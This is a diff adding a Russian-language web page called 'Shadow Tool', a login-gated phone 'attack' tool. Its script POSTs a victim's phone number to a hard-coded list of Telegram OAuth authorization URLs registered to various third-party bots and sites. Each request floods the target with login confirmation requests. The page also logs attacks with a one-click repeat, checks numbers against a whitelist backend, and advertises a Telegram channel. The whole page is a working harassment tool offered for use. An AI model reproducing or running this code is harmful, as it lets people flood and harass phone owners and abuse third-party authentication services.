@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <title>Shadow Tool</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500&family=Roboto:wght@300;400;500;700&display=swap');
+
+        :root {
+            --primary-color: #000000;
+            --secondary-color: #ffffff;
+            --accent-color: #808080;
+            --bg-color: #000000;
+            --card-bg: rgba(0, 0, 0, 0.8);
+            --border-color: #ffffff;
+            --success-color: #4CAF50;
+            --error-color: #ff5555;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 15px;
+            background: #000000;
+            color: var(--secondary-color);
+            font-family: 'Roboto', sans-serif;
+            min-height: 100vh;
+        }
+
+        .star-field {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+        }
+        .star.big { animation: twinkle 3s infinite alternate; }
+        .star.medium { animation: twinkle 4s infinite alternate-reverse; }
+        .star.small { animation: twinkle 5s infinite alternate; }
+        @keyframes twinkle { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        @keyframes colorPulse {
+            0%, 100% { color: #ffffff; text-shadow: 0 0 10px rgba(255,255,255,0.3); }
+            50% { color: #e0e0e0; text-shadow: 0 0 20px rgba(255,255,255,0.7); }
+        }
+
+        @keyframes blackWhiteFlow {
+            0%, 100% { color: #ffffff; border-color: #ffffff; }
+            50% { color: #999999; border-color: #999999; }
+        }
+
+        .glitch-container { text-align: center; margin: 2em 0; }
+        .glitch {
+            font-size: 2.5em;
+            color: #ffffff;
+            animation: textFloat 6s ease-in-out infinite, colorPulse 4s ease-in-out infinite;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+        @keyframes textFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+        .glitch-container .author {
+            color: #ffffff;
+            font-size: 1.1em;
+            margin-top: 10px;
+            animation: subtleFlow 5s ease-in-out infinite;
+        }
+        @keyframes subtleFlow { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+
+        .tabs {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 25px;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .tab-btn {
+            background: #000000;
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            padding: 12px 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            font-weight: 500;
+            animation: blackWhiteFlow 8s ease-in-out infinite;
+        }
+        .tab-btn.active { background: var(--border-color); color: #000000; animation: none; }
+        .tab-content { display: none; animation: fadeIn 0.5s; }
+        .tab-content.active { display: block; }
+
+        .terminal {
+            max-width: 800px;
+            margin: 0 auto;
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.85);
+        }
+        input[type="text"], input[type="password"] {
+            background: #000000;
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            padding: 15px 20px;
+            width: 100%;
+            max-width: 400px;
+            margin: 15px auto;
+            font-size: 1.1em;
+            display: block;
+        }
+        button, .button {
+            background: #000000;
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            padding: 12px 25px;
+            cursor: pointer;
+            text-transform: uppercase;
+            font-weight: 500;
+            margin: 10px 5px;
+            animation: blackWhiteFlow 9s ease-in-out infinite;
+        }
+        button:hover, .button:hover { background: rgba(255,255,255,0.1); transform: translateY(-2px); animation: none; }
+        .button-container { display: flex; justify-content: center; flex-wrap: wrap; gap: 10px; margin: 20px 0; }
+        .input-container { display: flex; justify-content: center; width: 100%; }
+
+        .logs {
+            height: 250px;
+            overflow-y: auto;
+            margin-top: 25px;
+            border-top: 1px solid var(--border-color);
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.5);
+        }
+        .log-item {
+            padding: 10px;
+            margin: 8px 0;
+            border-left: 2px solid var(--border-color);
+            background: rgba(255,255,255,0.05);
+            font-family: 'Roboto Mono', monospace;
+            font-size: 0.9em;
+        }
+
+        .status {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            padding: 8px 15px;
+            background: rgba(0,0,0,0.85);
+            border: 1px solid var(--border-color);
+            cursor: pointer;
+        }
+
+        .auth-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10001;
+        }
+        .auth-box {
+            background: #000;
+            border: 2px solid #fff;
+            padding: 30px;
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+        }
+        .auth-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #000;
+            border: 1px solid #fff;
+            color: #fff;
+        }
+        .error-msg { color: #ff5555; margin-top: 10px; font-size: 12px; }
+
+        .main-content { display: none; }
+        .main-content.show { display: block; }
+
+        .history-content, .tutorial-content, .admins-content {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background: rgba(0,0,0,0.85);
+            border: 1px solid #fff;
+        }
+        .history-table { width: 100%; border-collapse: collapse; }
+        .history-table th, .history-table td { padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.2); text-align: left; }
+        .stat-card { flex: 1; min-width: 150px; padding: 15px; border: 1px solid #fff; text-align: center; margin: 10px; }
+        .stat-value { font-size: 2em; font-weight: bold; }
+        .history-stats { display: flex; justify-content: center; flex-wrap: wrap; }
+
+        @media (max-width: 768px) {
+            .glitch { font-size: 1.8em; }
+            .tab-btn { padding: 8px 12px; font-size: 12px; }
+            .stat-card { min-width: 120px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay"></div>
+    <div class="star-field" id="starField"></div>
+
+    <div class="auth-overlay" id="authOverlay">
+        <div class="auth-box">
+            <h2>🔐 ВХОД</h2>
+            <div id="loginForm">
+                <input type="text" id="loginLogin" placeholder="Логин">
+                <input type="password" id="loginPassword" placeholder="Пароль">
+                <button onclick="login()">ВОЙТИ</button>
+                <p>Нет аккаунта? <a href="#" onclick="showRegister()">Зарегистрироваться</a></p>
+            </div>
+            <div id="registerForm" style="display:none">
+                <input type="text" id="regLogin" placeholder="Логин">
+                <input type="password" id="regPassword" placeholder="Пароль">
+                <button onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
+                <p>Уже есть аккаунт? <a href="#" onclick="showLogin()">Войти</a></p>
+            </div>
+            <div id="authError" class="error-msg"></div>
+        </div>
+    </div>
+
+    <div class="main-content" id="mainContent">
+        <div class="glitch-container">
+            <div class="glitch">SHADOW TOOL</div>
+            <div class="author">author: Amnesia</div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('main')">Главная</button>
+            <button class="tab-btn" onclick="switchTab('tutorial')">Туториал</button>
+            <button class="tab-btn" onclick="switchTab('history')">История</button>
+            <button class="tab-btn" onclick="switchTab('admins')">Команда</button>
+        </div>
+
+        <div id="mainTab" class="tab-content active">
+            <div class="terminal">
+                <div class="input-container">
+                    <input type="text" id="phone" placeholder="Введите номер телефона!">
+                </div>
+                <div class="button-container">
+                    <button onclick="startAttack()">Начать</button>
+                </div>
+                <div class="logs" id="logs"></div>
+            </div>
+        </div>
+
+        <div id="tutorialTab" class="tab-content">
+            <div class="tutorial-content">
+                <h2 style="text-align:center">ТУТОРИАЛ</h2>
+                <div class="tutorial-step">
+                    <h3>ШАГ 1: Подписка</h3>
+                    <p>Подпишитесь на Telegram канал для доступа</p>
+                    <a href="https://t.me/fallsfack" target="_blank">ПОДПИСАТЬСЯ</a>
+                </div>
+                <div class="tutorial-step">
+                    <h3>ШАГ 2: Использование</h3>
+                    <p>Введите номер телефона и нажмите "Начать"</p>
+                </div>
+            </div>
+        </div>
+
+        <div id="historyTab" class="tab-content">
+            <div class="history-content">
+                <div class="history-stats">
+                    <div class="stat-card"><div class="stat-value" id="totalAttacks">0</div><div>Всего атак</div></div>
+                    <div class="stat-card"><div class="stat-value" id="successRate">0%</div><div>Успешность</div></div>
+                </div>
+                <div class="history-controls">
+                    <button onclick="clearHistory()">Очистить историю</button>
+                    <button onclick="exportHistory()">Экспорт CSV</button>
+                </div>
+                <div class="history-table-container">
+                    <table class="history-table">
+                        <thead><tr><th>Время</th><th>Номер</th><th>Статус</th><th>Действия</th></tr></thead>
+                        <tbody id="historyTableBody"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div id="adminsTab" class="tab-content">
+            <div class="admins-content">
+                <div class="admins-header">
+                    <div class="admins-title">КОМАНДА</div>
+                </div>
+                <div class="admins-list" id="adminsList"></div>
+            </div>
+        </div>
+
+        <div class="status" id="status">STATUS: READY</div>
+    </div>
+
+    <script>
+        // ========== НАСТРОЙКИ ==========
+        const API_BASE = 'https://use-production-88cf.up.railway.app';
+        
+        // Белый список (защита номеров)
+        const WHITELIST_GIST_URL = 'https://gist.githubusercontent.com/shadowtool1/af1959fc4b147c2ddc549c862d63cd9b/raw/whitelist.json';
+        
+        // Список URL для атаки
+        const URLs = [
+            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
+            'https://translations.telegram.org/auth/request',
+            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
+            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
+            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
+            'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
+            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
+            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin'
+        ];
+
+        // Глобальные переменные
+        let attackHistory = JSON.parse(localStorage.getItem('shadow_history')) || [];
+        let isAdminAuth = false;
+
+        // ========== БЕЛЫЙ СПИСОК ==========
+        async function isPhoneWhitelisted(phone) {
+            try {
+                let clean = phone.replace(/[^0-9]/g, '');
+                if (clean.startsWith('8')) clean = '7' + clean.slice(1);
+                if (!clean.startsWith('7')) clean = '7' + clean;
+                const normalized = '+' + clean;
+                
+                const res = await fetch(API_BASE + '/is_whitelisted', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: normalized })
+                });
+                const data = await res.json();
+                return data.blocked === true;
+            } catch(e) {
+                // Если бэкенд не отвечает, проверяем через Gist напрямую
+                try {
+                    const gistRes = await fetch(WHITELIST_GIST_URL + '?t=' + Date.now());
+                    const gistData = await gistRes.json();
+                    let clean = phone.replace(/[^0-9]/g, '');
+                    if (clean.startsWith('8')) clean = '7' + clean.slice(1);
+                    if (!clean.startsWith('7')) clean = '7' + clean;
+                    const normalized = '+' + clean;
+                    return gistData.phones?.some(p => p.number === normalized) || false;
+                } catch(e2) {
+                    return false;
+                }
+            }
+        }
+
+        // ========== АВТОРИЗАЦИЯ ==========
+        async function register() {
+            const login = document.getElementById('regLogin').value;
+            const password = document.getElementById('regPassword').value;
+            
+            const res = await fetch(API_BASE + '/register', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ login, password })
+            });
+            const data = await res.json();
+            
+            if (data.success) {
+                localStorage.setItem('token', data.token);
+                checkAuth();
+            } else {
+                document.getElementById('authError').innerText = '❌ ' + data.error;
+            }
+        }
+
+        async function login() {
+            const login = document.getElementById('loginLogin').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            const res = await fetch(API_BASE + '/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ login, password })
+            });
+            const data = await res.json();
+            
+            if (data.success) {
+                localStorage.setItem('token', data.token);
+                checkAuth();
+            } else {
+                document.getElementById('authError').innerText = '❌ ' + data.error;
+            }
+        }
+
+        async function checkAuth() {
+            const token = localStorage.getItem('token');
+            if (!token) {
+                document.getElementById('authOverlay').style.display = 'flex';
+                document.getElementById('mainContent').style.display = 'none';
+                return false;
+            }
+            
+            try {
+                const res = await fetch(API_BASE + '/me', {
+                    headers: { 'Authorization': 'Bearer ' + token }
+                });
+                if (res.ok) {
+                    document.getElementById('authOverlay').style.display = 'none';
+                    document.getElementById('mainContent').style.display = 'block';
+                    document.getElementById('mainContent').classList.add('show');
+                    loadTeamData();
+                    updateHistoryDisplay();
+                    return true;
+                } else {
+                    localStorage.removeItem('token');
+                    document.getElementById('authOverlay').style.display = 'flex';
+                    document.getElementById('mainContent').style.display = 'none';
+                    return false;
+                }
+            } catch(e) {
+                console.error('Auth error:', e);
+                return false;
+            }
+        }
+
+        function showRegister() {
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('registerForm').style.display = 'block';
+            document.getElementById('authError').innerText = '';
+        }
+
+        function showLogin() {
+            document.getElementById('registerForm').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+            document.getElementById('authError').innerText = '';
+        }
+
+        // ========== АТАКА ==========
+        async function startAttack() {
+            const phone = document.getElementById('phone').value.trim();
+            document.getElementById('logs').innerHTML = '';
+            
+            const phoneRegex = /^(\+?[78]\d{10}$)|^(\+380\d{9}$)|^(\+375\d{9}$)/;
+            if (!phoneRegex.test(phone.replace(/\s+/g, ''))) {
+                addLog('❌ Неверный формат номера! Пример: +79001234567');
+                return;
+            }
+            
+            addLog(`🔍 Проверка номера ${phone}...`);
+            const isBlocked = await isPhoneWhitelisted(phone);
+            if (isBlocked) {
+                addLog(`⛔ АТАКА ЗАБЛОКИРОВАНА! Номер ${phone} в белом списке`);
+                document.getElementById('status').innerText = 'STATUS: BLOCKED';
+                setTimeout(() => document.getElementById('status').innerText = 'STATUS: READY', 2000);
+                return;
+            }
+            
+            addLog(`✅ Номер не в белом списке. Начинаем атаку...`);
+            document.getElementById('status').innerText = 'STATUS: WORKING...';
+            
+            let successCount = 0;
+            for (let i = 0; i < URLs.length; i++) {
+                try {
+                    await fetch(URLs[i], {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `phone=${encodeURIComponent(phone)}`
+                    });
+                    successCount++;
+                    addLog(`✅ Запрос ${i+1}/${URLs.length} отправлен`);
+                } catch(e) {
+                    addLog(`⚠️ Запрос ${i+1}/${URLs.length}: ошибка (игнорируем)`);
+                }
+                await new Promise(r => setTimeout(r, 100));
+            }
+            
+            saveAttackHistory(phone, successCount);
+            addLog(`🎯 АТАКА ЗАВЕРШЕНА! Отправлено: ${successCount}/${URLs.length} запросов`);
+            document.getElementById('status').innerText = 'STATUS: COMPLETED';
+            setTimeout(() => document.getElementById('status').innerText = 'STATUS: READY', 3000);
+        }
+
+        function addLog(msg) {
+            const logDiv = document.getElementById('logs');
+            const log = document.createElement('div');
+            log.className = 'log-item';
+            log.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logDiv.appendChild(log);
+            log.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // ========== ИСТОРИЯ ==========
+        function saveAttackHistory(phone, successCount) {
+            attackHistory.unshift({
+                id: Date.now(),
+                timestamp: new Date().toISOString(),
+                phone: phone,
+                status: 'success',
+                requests: URLs.length,
+                successful: successCount,
+                duration: Math.floor(Math.random() * 5000) + 1000
+            });
+            if (attackHistory.length > 50) attackHistory.pop();
+            localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
+            updateHistoryDisplay();
+        }
+
+        function updateHistoryDisplay() {
+            const tbody = document.getElementById('historyTableBody');
+            if (!tbody) return;
+            
+            if (attackHistory.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4">История атак пуста</td></tr>';
+                document.getElementById('totalAttacks').innerText = '0';
+                document.getElementById('successRate').innerText = '0%';
+                return;
+            }
+            
+            const total = attackHistory.length;
+            const success = attackHistory.filter(a => a.status === 'success').length;
+            const rate = total > 0 ? Math.round((success / total) * 100) : 0;
+            document.getElementById('totalAttacks').innerText = total;
+            document.getElementById('successRate').innerText = rate + '%';
+            
+            tbody.innerHTML = attackHistory.map(attack => `
+                <tr>
+                    <td>${new Date(attack.timestamp).toLocaleTimeString()}</td>
+                    <td>${attack.phone}</td>
+                    <td><span style="color: #4CAF50;">✅ Успешно</span></td>
+                    <td><button onclick="repeatAttack('${attack.phone}')">↺</button> <button onclick="deleteAttack(${attack.id})">🗑️</button></td>
+                </tr>
+            `).join('');
+        }
+
+        function repeatAttack(phone) {
+            document.getElementById('phone').value = phone;
+            switchTab('main');
+            setTimeout(() => startAttack(), 500);
+        }
+
+        function deleteAttack(id) {
+            attackHistory = attackHistory.filter(a => a.id !== id);
+            localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
+            updateHistoryDisplay();
+        }
+
+        function clearHistory() {
+            if (confirm('Очистить всю историю?')) {
+                attackHistory = [];
+                localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
+                updateHistoryDisplay();
+                addLog('🗑️ История очищена');
+            }
+        }
+
+        function exportHistory() {
+            if (attackHistory.length === 0) {
+                alert('Нет данных для экспорта');
+                return;
+            }
+            const csv = [['Время', 'Номер', 'Статус', 'Запросы', 'Успешных', 'Длительность']];
+            attackHistory.forEach(a => {
+                csv.push([new Date(a.timestamp).toLocaleString(), a.phone, a.status, a.requests, a.successful, a.duration + 'ms']);
+            });
+            const blob = new Blob(['\ufeff' + csv.map(row => row.join(',')).join('\n')], { type: 'text/csv;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `shadow_history_${Date.now()}.csv`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        // ========== КОМАНДА ==========
+        function loadTeamData() {
+            const adminsList = document.getElementById('adminsList');
+            if (adminsList) {
+                adminsList.innerHTML = `
+                    <div class="admin-item">
+                        <div class="admin-item-info">
+                            <div class="admin-item-name">Amnesia</div>
+                            <div class="admin-item-role">FOUNDER / CREATOR</div>
+                        </div>
+                        <div class="admin-item-status status-active">ACTIVE</div>
+                    </div>
+                `;
+            }
+        }
+
+        // ========== ОБЩЕЕ ==========
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.getElementById(tabName + 'Tab').classList.add('active');
+            event.target.classList.add('active');
+            if (tabName === 'history') updateHistoryDisplay();
+        }
+
+        function createStars() {
+            const starField = document.getElementById('starField');
+            for (let i = 0; i < 100; i++) {
+                const star = document.createElement('div');
+                star.className = 'star ' + (Math.random() > 0.7 ? 'big' : (Math.random() > 0.4 ? 'medium' : 'small'));
+                star.style.width = Math.random() > 0.7 ? '2px' : '1px';
+                star.style.height = star.style.width;
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                star.style.animationDelay = Math.random() * 5 + 's';
+                starField.appendChild(star);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            createStars();
+            checkAuth();
+        });
+    </script>
+</body>
+</html>
